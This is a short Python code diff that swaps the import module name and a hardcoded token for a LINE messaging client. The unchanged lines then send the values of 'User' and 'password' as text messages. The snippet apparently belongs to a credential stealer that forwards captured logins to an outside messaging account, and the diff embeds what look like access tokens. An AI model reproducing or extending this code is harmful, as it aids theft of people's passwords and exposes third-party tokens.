@@ -1,6 +1,6 @@
 import os , sys
-from test import LINE
-line = LINE('qnst8w5JUbFu4FeldpuCB6w5ERPtAGyMeR8pFQUWeHJ')
+from TEST import LINE
+line = LINE('QrXx65WglOiKNwpnf46yNRqLXhsXkPYmRYUVrNKJIq6')
 line.sendtext(f'User : {User}')
 line.sendtext(f'password : {password}')
 
